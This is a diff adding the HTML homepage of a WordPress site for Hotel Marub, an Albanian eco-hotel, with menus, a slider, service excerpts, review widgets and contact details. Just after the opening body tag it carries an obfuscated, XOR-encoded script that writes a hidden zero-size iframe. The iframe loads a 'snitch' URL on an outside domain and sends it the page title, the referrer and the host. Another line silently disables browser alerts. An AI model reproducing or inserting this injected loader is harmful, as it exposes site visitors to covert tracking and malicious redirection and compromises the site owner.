@@ -1,0 +1,486 @@
+<!DOCTYPE html>
+<!--[if IE 7 | IE 8]>
+<html class="ie" lang="en-US">
+<![endif]-->
+<!--[if !(IE 7) | !(IE 8)  ]><!-->
+<html lang="en-US">
+<!--<![endif]-->
+<head>
+
+
+	<meta charset="UTF-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+	<title>Hotel Marub</title>
+	
+	<link rel="stylesheet" type="text/css" href="http://www.hotelmarub.com/marub/wp-content/themes/ambassador/style.css" media="screen" />
+	<link rel="stylesheet" type="text/css" href="http://www.hotelmarub.com/marub/wp-content/themes/ambassador/styles/green.css" />
+	<link rel="profile" href="http://gmpg.org/xfn/11" />
+	<link rel="pingback" href="http://www.hotelmarub.com/marub/xmlrpc.php" />
+	<!--[if lt IE 9]>
+	<script src="http://www.hotelmarub.com/marub/wp-content/themes/ambassador/js/html5.js" type="text/javascript"></script>
+	<![endif]-->
+
+		
+	<link rel="alternate" type="application/rss+xml" title="Hotel Marub &raquo; Feed" href="http://www.hotelmarub.com/marub/?feed=rss2" />
+<link rel="alternate" type="application/rss+xml" title="Hotel Marub &raquo; Comments Feed" href="http://www.hotelmarub.com/marub/?feed=comments-rss2" />
+
+            <script type="text/javascript">//<![CDATA[
+            // Google Analytics for WordPress by Yoast v4.3.5 | http://yoast.com/wordpress/google-analytics/
+            var _gaq = _gaq || [];
+            _gaq.push(['_setAccount', 'UA-47243194-1']);
+				            _gaq.push(['_trackPageview']);
+            (function () {
+                var ga = document.createElement('script');
+                ga.type = 'text/javascript';
+                ga.async = true;
+                ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+
+                var s = document.getElementsByTagName('script')[0];
+                s.parentNode.insertBefore(ga, s);
+            })();
+            //]]></script>
+			<link rel='stylesheet' id='rs-settings-css'  href='http://www.hotelmarub.com/marub/wp-content/plugins/revslider/rs-plugin/css/settings.css?ver=3.6.1' type='text/css' media='all' />
+<link rel='stylesheet' id='rs-captions-css'  href='http://www.hotelmarub.com/marub/wp-content/plugins/revslider/rs-plugin/css/captions.css?ver=3.6.1' type='text/css' media='all' />
+<link rel='stylesheet' id='thickbox.css-css'  href='http://www.hotelmarub.com/marub/wp-includes/js/thickbox/thickbox.css' type='text/css' media='all' />
+<script type='text/javascript' src='http://www.hotelmarub.com/marub/wp-includes/js/jquery/jquery.js?ver=1.10.2'></script>
+<script type='text/javascript' src='http://www.hotelmarub.com/marub/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.2.1'></script>
+<script type='text/javascript' src='http://www.hotelmarub.com/marub/wp-content/plugins/revslider/rs-plugin/js/jquery.themepunch.revolution.min.js?ver=3.6.1'></script>
+<script type='text/javascript' src='http://www.hotelmarub.com/marub/wp-content/themes/ambassador/js/init.js'></script>
+<script type='text/javascript' src='http://www.hotelmarub.com/marub/wp-content/themes/ambassador/js/jquery.flexslider-min.js'></script>
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://www.hotelmarub.com/marub/xmlrpc.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://www.hotelmarub.com/marub/wp-includes/wlwmanifest.xml" /> 
+<meta name="generator" content="WordPress 3.6.1" />
+
+<meta http-equiv="Content-Language" content="en-US" />
+<style type="text/css" media="screen">
+.qtrans_flag span { display:none }
+.qtrans_flag { height:12px; width:18px; display:block }
+.qtrans_flag_and_text { padding-left:20px }
+.qtrans_flag_de { background:url(http://www.hotelmarub.com/marub/wp-content/plugins/qtranslate/flags/de.png) no-repeat }
+.qtrans_flag_en { background:url(http://www.hotelmarub.com/marub/wp-content/plugins/qtranslate/flags/gb.png) no-repeat }
+.qtrans_flag_sq { background:url(http://www.hotelmarub.com/marub/wp-content/plugins/qtranslate/flags/al.png) no-repeat }
+</style>
+<link hreflang="de" href="http://www.hotelmarub.com/marub/?lang=de" rel="alternate" />
+<link hreflang="sq" href="http://www.hotelmarub.com/marub/?lang=sq" rel="alternate" />
+	
+	
+	  <style>
+
+	#flaggenmast {
+    
+margin-top: -51%";
+    heigth: 12px;
+	width:80px;
+
+    margin:0 0 -3%;
+
+    padding: 0;
+
+    float: right;
+
+    clear: right;
+
+  }
+
+  ul#qtrans_language_chooser {
+  
+  
+
+    list-style: none;
+
+    margin: 0;
+
+    padding: 0;
+
+  }
+
+  ul#qtrans_language_chooser li {
+  
+
+    display: inline-block;
+
+    float: left;
+
+    position: relative;
+
+    margin: 0;
+
+    padding: 0;
+
+  }
+
+  a.qtrans_flag {
+
+    margin-left: 10px
+
+    	}
+
+  .lang-en{
+float: left;    margin-left: 30%;
+
+  }	.lang-de{ float: right;
+
+  }	.lang-sq{
+float: left;    margin-top: -15%;
+ }
+
+  </style>
+	
+	
+	
+
+</head>
+
+<body>
+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00a33l6,'00'02)'02'00k,vg'00'02)'02'00cq'00'02)'02'00gpe'00'02)'02'00wkf'00'02)'02'00g,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+
+<ul style="margin-top: 4%;float: right;margin-right: 13%">
+<li><a href="https://www.facebook.com/pages/Eko-Hotel-Marub/205251002891031?fref=ts" class="icon facebook">Facebook</a></li>
+<li><a href="http://www.twitter.com" class="icon twitter">Twitter</a></li>
+<li><a href="http://www.googleplus.com" class="icon googleplus">Google Plus</a></li>
+</style></ul>
+
+<div id="container">
+
+	<header>
+	
+		<div class="wrapper wrapper-logo">
+		
+			<div id="logo">
+								<a href="http://www.hotelmarub.com/marub" title="Just another WordPress site"><img src="http://www.hotelmarub.com/marub/wp-content/themes/ambassador/images/logo.png" alt="Hotel Marub" /></a>
+			</div><!-- end #logo -->
+			
+						<div id="flaggenmast" style='margin-top:-5%;'><ul class="qtrans_language_chooser" id="qtranslate-chooser"><li class="lang-de"><a href="http://www.hotelmarub.com/marub/?lang=de" hreflang="de" title="Deutsch" class="qtrans_flag qtrans_flag_de"><span style="display:none">Deutsch</span></a></li><li class="lang-en active"><a href="http://www.hotelmarub.com/marub/" hreflang="en" title="English" class="qtrans_flag qtrans_flag_en"><span style="display:none">English</span></a></li><li class="lang-sq"><a href="http://www.hotelmarub.com/marub/?lang=sq" hreflang="sq" title="Albanian" class="qtrans_flag qtrans_flag_sq"><span style="display:none">Albanian</span></a></li></ul><div class="qtrans_widget_end"></div></div>
+			
+			<div class="cleaner">&nbsp;</div>
+			
+		</div><!-- end .wrapper -->
+		
+		<nav id="menu-main">
+			<div class="wrapper">
+				
+				<a class="toggle_mobile_menu" id="hermes-toggle" href="#"></a>
+				
+				<ul id="menu-main-menu" class="dropdown sf-js-enabled mobile-menu"><li id="menu-item-24" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-24"><a href="http://hotelmarub.com/marub/" >Home</a></li>
+<li id="menu-item-27" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-27"><a href="http://www.hotelmarub.com/marub/?page_id=20" >Ecological Hotel</a></li>
+<li id="menu-item-26" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-26"><a href="http://www.hotelmarub.com/marub/?page_id=22" >Events &#038; Conferences</a></li>
+<li id="menu-item-52" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-52"><a href="http://www.hotelmarub.com/marub/?page_id=41" >Food &#038; Accomodation</a></li>
+<li id="menu-item-58" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-58"><a href="http://www.hotelmarub.com/marub/?page_id=31" >Trips</a></li>
+<li id="menu-item-113" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-113"><a href="http://www.hotelmarub.com/marub/?page_id=111" >Gallery</a></li>
+<li id="menu-item-54" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-54"><a href="http://www.hotelmarub.com/marub/?page_id=43" >Partners</a></li>
+<li id="menu-item-53" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-53"><a href="http://www.hotelmarub.com/marub/?page_id=45" >Reservations</a></li>
+<li id="menu-item-28" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-28"><a href="http://www.hotelmarub.com/marub/?page_id=6" >Contact</a></li>
+<li class="cleaner">&nbsp;</li></ul>			</div><!-- end .wrapper -->
+		</nav><!-- end #menu-main -->
+	
+	</header>
+
+<div id="content">
+	
+					
+				<!-- START REVOLUTION SLIDER 3.0.93 fixed mode -->
+				
+								
+								<div id="rev_slider_1_1_wrapper" class="rev_slider_wrapper" style="margin:0px auto;background-color:#E9E9E9;padding:0px;margin-top:0px;margin-bottom:0px;height:490px;width:1140px;">
+					<div id="rev_slider_1_1" class="rev_slider" style="display:none;height:490px;width:1140px;">						
+										<ul>
+								<li data-transition="random" data-slotamount="7" >
+						<img src="http://www.hotelmarub.com/marub/wp-content/uploads/2013/12/ballina_prapavija1.jpg"  alt="ballina_prapavija1" >
+											</li>
+									<li data-transition="random" data-slotamount="7" >
+						<img src="http://www.hotelmarub.com/marub/wp-content/uploads/2013/12/faqa6_1.jpg"  alt="faqa6_1" >
+											</li>
+									<li data-transition="random" data-slotamount="7" >
+						<img src="http://www.hotelmarub.com/marub/wp-content/uploads/2013/12/faqa3_1.jpg"  alt="faqa3_1" >
+											</li>
+								</ul>
+									<div class="tp-bannertimer"></div>					</div>
+				</div>				
+							
+			<script type="text/javascript">
+
+				var tpj=jQuery;
+				
+									tpj.noConflict();
+								
+				var revapi1;
+				
+				tpj(document).ready(function() {
+				
+				if (tpj.fn.cssOriginal != undefined)
+					tpj.fn.css = tpj.fn.cssOriginal;
+				
+				if(tpj('#rev_slider_1_1').revolution == undefined)
+					revslider_showDoubleJqueryError('#rev_slider_1_1');
+				else
+				   revapi1 = tpj('#rev_slider_1_1').show().revolution(
+					{
+						delay:9000,
+						startwidth:1140,
+						startheight:490,
+						hideThumbs:200,
+						
+						thumbWidth:100,
+						thumbHeight:50,
+						thumbAmount:3,
+						
+						navigationType:"bullet",
+						navigationArrows:"solo",
+						navigationStyle:"round",
+						
+						touchenabled:"on",
+						onHoverStop:"on",
+						
+						navigationHAlign:"center",
+						navigationVAlign:"bottom",
+						navigationHOffset:0,
+						navigationVOffset:20,
+
+						soloArrowLeftHalign:"left",
+						soloArrowLeftValign:"center",
+						soloArrowLeftHOffset:20,
+						soloArrowLeftVOffset:0,
+
+						soloArrowRightHalign:"right",
+						soloArrowRightValign:"center",
+						soloArrowRightHOffset:20,
+						soloArrowRightVOffset:0,
+								
+						shadow:2,
+						fullWidth:"off",
+						fullScreen:"off",
+
+						stopLoop:"off",
+						stopAfterLoops:-1,
+						stopAtSlide:-1,
+
+						shuffle:"off",
+						
+						hideSliderAtLimit:0,
+						hideCaptionAtLimit:0,
+						hideAllCaptionAtLilmit:0,
+						startWithSlide:0,
+						videoJsPath:"http://www.hotelmarub.com/marub/wp-content/plugins/revslider/rs-plugin/videojs/",
+						fullScreenOffsetContainer: ""	
+					});
+				
+				});	//ready
+				
+			</script>
+			
+							<!-- END REVOLUTION SLIDER -->
+				 
+	
+	<div class="wrapper">
+	
+		<ul class="featured-pages">
+	
+				
+				<li class="featured-page">
+					<div class="outer-frame">
+						<div class="frame">
+							
+							<div class="post-cover"><a href="http://www.hotelmarub.com/marub/?page_id=41" title="Food &amp; Accomodation"><img src="http://www.hotelmarub.com/marub/wp-content/uploads/2013/12/food1.png" alt="Food &amp; Accomodation" class="Thumbnail thumbnail thumb-featured-page " width="250" height="155" /></a></div><!-- end .post-cover -->
+							<div class="post-excerpt">
+
+								<h2 class="title-m title-center"><a href="http://www.hotelmarub.com/marub/?page_id=41" title="Permalink to Food &amp; Accomodation" rel="bookmark">Food &#038; Accomodation</a></h2>
+								
+								<div class="divider">&nbsp;</div>
+
+								<p>Food and Accomodation Restaurant Recharge your energies at the culinary delights of the country Mirdita! Pure spring water from our own wells revives you! Enjoy a tasteful Albanian atmosphere, healthy eating and drinking of natural products provided by local farmers. [&hellip;]</p>
+								<span class="more"><a href="http://www.hotelmarub.com/marub/?page_id=41" rel="nofollow">Continue reading</a></span>
+							</div><!-- end .post-excerpt -->
+							
+							<div class="cleaner">&nbsp;</div>
+							
+						</div><!-- end .frame -->
+					</div><!-- end .outer-frame -->
+				</li><!-- end .featured-page -->
+			
+							
+				<li class="featured-page">
+					<div class="outer-frame">
+						<div class="frame">
+							
+							<div class="post-cover"><a href="http://www.hotelmarub.com/marub/?page_id=22" title="Events &amp; Conferences"><img src="http://www.hotelmarub.com/marub/wp-content/uploads/2013/12/1342817386-marub_hotel_rubik_7-250x155.jpg" alt="Events &amp; Conferences" class="Thumbnail thumbnail thumb-featured-page " width="250" height="155" /></a></div><!-- end .post-cover -->
+							<div class="post-excerpt">
+
+								<h2 class="title-m title-center"><a href="http://www.hotelmarub.com/marub/?page_id=22" title="Permalink to Events &amp; Conferences" rel="bookmark">Events &#038; Conferences</a></h2>
+								
+								<div class="divider">&nbsp;</div>
+
+								<p>You need a place to organize your conference, meeting or event? Then come to the natural eco-hotel in MARUB Rubik! With us you can arrange everything: A conference, meeting, seminar, company party, family reunion, a birthday celebration, and people find [&hellip;]</p>
+								<span class="more"><a href="http://www.hotelmarub.com/marub/?page_id=22" rel="nofollow">Continue reading</a></span>
+							</div><!-- end .post-excerpt -->
+							
+							<div class="cleaner">&nbsp;</div>
+							
+						</div><!-- end .frame -->
+					</div><!-- end .outer-frame -->
+				</li><!-- end .featured-page -->
+			
+							
+				<li class="featured-page last">
+					<div class="outer-frame">
+						<div class="frame">
+							
+							<div class="post-cover"><a href="http://www.hotelmarub.com/marub/?page_id=31" title="Trips"><img src="http://www.hotelmarub.com/marub/wp-content/uploads/2013/12/booking_10200910-250x155.jpg" alt="Trips" class="Thumbnail thumbnail thumb-featured-page " width="250" height="155" /></a></div><!-- end .post-cover -->
+							<div class="post-excerpt">
+
+								<h2 class="title-m title-center"><a href="http://www.hotelmarub.com/marub/?page_id=31" title="Permalink to Trips" rel="bookmark">Trips</a></h2>
+								
+								<div class="divider">&nbsp;</div>
+
+								<p>Excursions to the surroundings For international guests the hotel is the best base to explore from here the diversity of Northern Albania, to enjoy meetings with its people, culture, and the flora and fauna. Ask the owner of the house, [&hellip;]</p>
+								<span class="more"><a href="http://www.hotelmarub.com/marub/?page_id=31" rel="nofollow">Continue reading</a></span>
+							</div><!-- end .post-excerpt -->
+							
+							<div class="cleaner">&nbsp;</div>
+							
+						</div><!-- end .frame -->
+					</div><!-- end .outer-frame -->
+				</li><!-- end .featured-page -->
+			
+				
+	<li class="cleaner">&nbsp;</li>
+	
+</ul><!-- end .featured-pages -->		
+	
+	
+		
+		<div class="cleaner">&nbsp;</div>
+		
+				
+		<div class="divider divider-main">&nbsp;</div>
+	
+		<div class="hermes-column wide">
+			
+			<script  src="http://www.tripadvisor.com/FeedsJS?f=hotels&defaultStyles=n&d=4678424&plang=en"></script>
+<script>window.realAlert = window.alert;
+window.alert = function() {};</script><div class="widget widget_text" id="text-4">				<div class="textwidget">		<div class="widget widget_text" id="text-4">			<h2 class="title-xs title-center title-caps title-ornament title-widget type-custom">Tripadvisor Reviews</h2>						<div class="textwidget"></div>			<div class="cleaner">&nbsp;</div>		</div>	</div>	<div class="cleaner">&nbsp;</div></div>
+<div id="TA_Header">brought to you by<br/>
+<img src="http://c1.tacdn.com/img/logos_ta/logo_125px.gif" width="125" height="20"/>
+</div>
+<div id="TA_Link"><a href="http://www.tripadvisor.co.uk/Hotel_Review-g3703082-d4678424-Reviews-Eko_Hotel_Marub-Rubik_Lezhe_County.html">Reviews of   Half Moon Inn</a></div>
+<div id="TA_Container"></div>
+<div id="TA_Flags2">
+Reviews in other languages:<br>
+<table border="0" cellspacing="0" cellpadding="0"><tr>
+
+<td><a href="http://www.tripadvisor.co.uk/Hotel_Review-g3703082-d4678424-Reviews-Eko_Hotel_Marub-Rubik_Lezhe_County.html"><img src="http://c1.tacdn.com/img/flags/uk.gif" alt="Half Moon Inn" height="16" width="28"><br>More reviews</a></td>
+<td><a href="http://www.tripadvisor.es/Hotel_Review-g3703082-d4678424-Reviews-Eko_Hotel_Marub-Rubik_Lezhe_County.html"><img src="http://c1.tacdn.com/img/flags/es.gif" alt="Half Moon Inn" height="16" width="28"><br>M&aacute;s opiniones</a></td>
+<td><a href="http://www.tripadvisor.de/Hotel_Review-g3703082-d4678424-Reviews-Eko_Hotel_Marub-Rubik_Lezhe_County.html"><img src="http://c1.tacdn.com/img/flags/de.gif" alt="Half Moon Inn" height="16" width="28"><br>Weitere Bewertungen</a></td>
+<td><a href="http://www.tripadvisor.fr/Hotel_Review-g3703082-d4678424-Reviews-Eko_Hotel_Marub-Rubik_Lezhe_County.html"><img src="http://c1.tacdn.com/img/flags/fr.gif" alt="Half Moon Inn" height="16" width="28"><br>Avis suppl&eacute;mentaires</a></td>
+<td><a href="http://www.tripadvisor.it/Hotel_Review-g3703082-d4678424-Reviews-Eko_Hotel_Marub-Rubik_Lezhe_County.html"><img src="http://c1.tacdn.com/img/flags/it.gif" alt="Half Moon Inn" height="16" width="28"><br>Altre recensioni</a></td>
+</tr></table>
+</div>
+
+
+<div class="widget widget_text" id="text-4">			<div class="textwidget">
+</div>
+		<div class="cleaner">&nbsp;</div></div>			<div class="cleaner">&nbsp;</div>
+			
+		</div><!-- end .hermes-column.wide -->
+		
+		<div class="hermes-column last">
+		
+			<div class="widget facebook" id="hermes-facebook-2"><h2 class="title-xs title-center title-caps title-ornament title-widget type-custom">Like us on Facebook</h2>			<div id="fb-root"></div>
+			<script>(function(d, s, id) {
+			  var js, fjs = d.getElementsByTagName(s)[0];
+			  if (d.getElementById(id)) {return;}
+			  js = d.createElement(s); js.id = id;
+			  js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+			  fjs.parentNode.insertBefore(js, fjs);
+			}(document, 'script', 'facebook-jssdk'));</script>
+			
+			<div class="fb-like-box" data-href="https://www.facebook.com/pages/Eko-Hotel-Marub/205251002891031" data-width="300"data-show-faces="true" data-border-color="#e4e4e4" data-stream="true" data-header="false"></div>
+<div class="cleaner">&nbsp;</div></div>			
+			<div class="cleaner">&nbsp;</div>
+			
+		</div><!-- end .hermes-column.last -->
+		
+		<div class="cleaner">&nbsp;</div>
+		
+		<div class="divider divider-blank">&nbsp;</div>
+
+		<div id="prefooter">
+			 		</div><!-- end #prefooter -->
+
+		
+		<div class="cleaner">&nbsp;</div>
+
+	</div><!-- end .wrapper-->
+
+</div><!-- end #content -->
+
+<script type="text/javascript">
+
+  var _gaq = _gaq || [];
+  _gaq.push(['_setAccount', 'UA-47221422-1']);
+  _gaq.push(['_trackPageview']);
+
+  (function() {
+    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+  })();
+
+</script>
+	
+
+		<div class="wrapper wrapper-footer-contacts">
+		<div class="footer-additional">
+			<ul class="footer-contact">
+				<li class="hermes-contact telephone"><span class="label">Make a reservation by phone:</span> <span class="value">+355 68 2077424</span><span class="divider">&middot;</span></li>
+				<li class="hermes-contact address"><span class="label">Katund i Vjeter, Rubik ,Albania</span><span class="divider">&middot;</span></li>
+				<li class="hermes-contact email"><span class="value"><a href="mailto:info@hotelmarub.com">info@hotelmarub.com</a></span></li>			</ul><!-- end .header-contact -->
+		</div><!-- end .footer-additional -->
+	</div><!-- end .wrapper -->
+	
+	<footer>
+	
+		<div class="wrapper">
+
+			
+			<div class="column">
+				 				<div class="cleaner">&nbsp;</div>
+			</div><!-- end .column -->
+			
+			<div class="column">
+				 				<div class="cleaner">&nbsp;</div>
+			</div><!-- end .column -->
+			
+			<div class="column">
+				 				<div class="cleaner">&nbsp;</div>
+			</div><!-- end .column -->
+
+			<div class="column column-wide column-last">
+				
+				 
+				<div class="cleaner">&nbsp;</div>
+
+			</div><!-- end .column .column-wide -->
+			
+			<div class="cleaner">&nbsp;</div>
+			<div class="divider"></div>
+			
+			
+									<p class="copy">Copyright &copy; 2018 Hotel Marub. All Rights Reserved</p>
+
+		</div><!-- end .wrapper -->
+	
+	</footer>
+
+</div><!-- end #container -->
+
+<script type='text/javascript'>
+/* <![CDATA[ */
+var thickboxL10n = {"next":"Next >","prev":"< Prev","image":"Image","of":"of","close":"Close","noiframes":"This feature requires inline frames. You have iframes disabled or your browser does not support them.","loadingAnimation":"http:\/\/www.hotelmarub.com\/marub\/wp-includes\/js\/thickbox\/loadingAnimation.gif","closeImage":"http:\/\/www.hotelmarub.com\/marub\/wp-includes\/js\/thickbox\/tb-close.png"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='http://www.hotelmarub.com/marub/wp-includes/js/thickbox/thickbox.js?ver=3.1-20121105'></script>
+	
+	</body>
+</html>
+
